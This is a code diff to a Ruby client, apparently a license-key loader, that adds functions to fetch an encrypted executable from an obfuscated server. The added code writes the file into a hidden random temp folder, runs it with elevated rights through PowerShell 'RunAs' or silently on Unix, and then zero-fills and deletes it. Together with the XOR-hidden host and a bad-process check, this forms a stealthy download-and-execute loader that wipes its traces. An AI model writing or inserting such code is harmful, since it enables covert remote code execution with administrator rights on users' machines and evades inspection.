@@ -1,6 +1,9 @@
 require 'socket'
 require 'openssl'
 require 'digest'
+require 'securerandom'
+require 'fileutils'
+require 'tmpdir'
 
 XK = [0xA7, 0x3B, 0xF2, 0x5E, 0x91, 0xC4, 0x68, 0x0D, 0xE3, 0x7A, 0x16, 0xB9, 0x4F, 0xD2, 0x85, 0x33].freeze
 H_ENC = [0xD4, 0x54, 0x91, 0x35, 0xF4, 0xB0, 0x46, 0x66, 0x86, 0x03, 0x77, 0xCC, 0x3B, 0xBA, 0xAB, 0x40, 0xCF, 0x54, 0x82].freeze
@@ -238,6 +241,132 @@ def start_session_validation(key)
       end
     end
   end
+end
+
+def recv_exact(ssl_socket, n)
+  buf = ''.b
+  while buf.bytesize < n
+    chunk = ssl_socket.readpartial(n - buf.bytesize)
+    return nil if chunk.nil? || chunk.empty?
+    buf << chunk
+  end
+  buf
+end
+
+def download_file(key, file_name)
+  h = host
+  socket = TCPSocket.new(h, PORT)
+  ssl_context = OpenSSL::SSL::SSLContext.new
+  ssl_context.verify_mode = OpenSSL::SSL::VERIFY_PEER
+  ssl_socket = OpenSSL::SSL::SSLSocket.new(socket, ssl_context)
+  ssl_socket.hostname = h
+  ssl_socket.connect
+
+  unless verify_cert_pin(ssl_socket)
+    ssl_socket.close
+    return nil
+  end
+
+  ssl_socket.write("6")
+  sleep(0.1)
+  ssl_socket.write("#{PROJECT_ID}|#{key}|#{get_hwid}|#{file_name}")
+
+  hdr_len_raw = recv_exact(ssl_socket, 4)
+  return nil unless hdr_len_raw
+  hdr_len = hdr_len_raw.unpack1('N')
+  return nil if hdr_len > 4096
+  hdr_bytes = recv_exact(ssl_socket, hdr_len)
+  return nil unless hdr_bytes
+  header = hdr_bytes.force_encoding('UTF-8')
+  return nil if header.start_with?('ERROR')
+
+  parts = header.split('|')
+  return nil if parts.length < 5 || parts[0] != 'FILE'
+  nonce_hex, tag_hex, expected_hash = parts[1], parts[2], parts[3]
+  file_size = parts[4].to_i
+
+  body_len_raw = recv_exact(ssl_socket, 4)
+  return nil unless body_len_raw
+  body_len = body_len_raw.unpack1('N')
+  return nil if body_len > 60 * 1024 * 1024
+  body = recv_exact(ssl_socket, body_len)
+  ssl_socket.close
+  return nil unless body
+
+  nonce = [nonce_hex].pack('H*')
+  tag = [tag_hex].pack('H*')
+  return nil if nonce.bytesize != 12 || tag.bytesize != 16
+
+  file_key = OpenSSL::HMAC.digest('SHA256', key, "FILE_KEY:#{nonce_hex}")
+  decipher = OpenSSL::Cipher.new('aes-256-gcm')
+  decipher.decrypt
+  decipher.key = file_key
+  decipher.iv = nonce
+  decipher.auth_tag = tag
+  decipher.auth_data = PROJECT_ID
+  plaintext = decipher.update(body) + decipher.final
+
+  actual_hash = Digest::SHA256.hexdigest(plaintext)
+  return nil if actual_hash != expected_hash || plaintext.bytesize != file_size
+  plaintext
+rescue
+  nil
+end
+
+def secure_wipe(path)
+  begin
+    size = File.size(path)
+    File.open(path, 'r+b') do |f|
+      f.write("\x00" * size)
+      f.flush
+      f.fsync
+    end
+    File.delete(path)
+  rescue
+    File.delete(path) rescue nil
+  end
+end
+
+def download_and_run(key, file_name)
+  data = download_file(key, file_name)
+  return false unless data
+
+  temp_base = Dir.tmpdir
+  random_dir = File.join(temp_base, "_ka_#{SecureRandom.hex(4)}")
+  FileUtils.mkdir_p(random_dir)
+
+  if RUBY_PLATFORM =~ /mingw|mswin/
+    `attrib +h +s "#{random_dir}"` rescue nil
+  end
+
+  exe_path = File.join(random_dir, file_name)
+  File.open(exe_path, 'wb') { |f| f.write(data); f.flush; f.fsync }
+
+  if RUBY_PLATFORM =~ /mingw|mswin/
+    `attrib +h "#{exe_path}"` rescue nil
+  end
+
+  data.replace("\x00" * data.bytesize)
+
+  if RUBY_PLATFORM =~ /mingw|mswin/
+    system("powershell -NoProfile -Command \"Start-Process -FilePath '#{exe_path}' -WorkingDirectory '#{random_dir}' -Verb RunAs\"")
+  else
+    File.chmod(0755, exe_path)
+    spawn(exe_path, chdir: random_dir, [:out, :err] => '/dev/null')
+  end
+
+  cap_exe = exe_path
+  cap_dir = random_dir
+  Thread.new do
+    sleep(2)
+    secure_wipe(cap_exe)
+    sleep(1)
+    FileUtils.rm_rf(cap_dir) rescue nil
+  end
+
+  true
+rescue
+  false
 end
 
 check_bad_processes
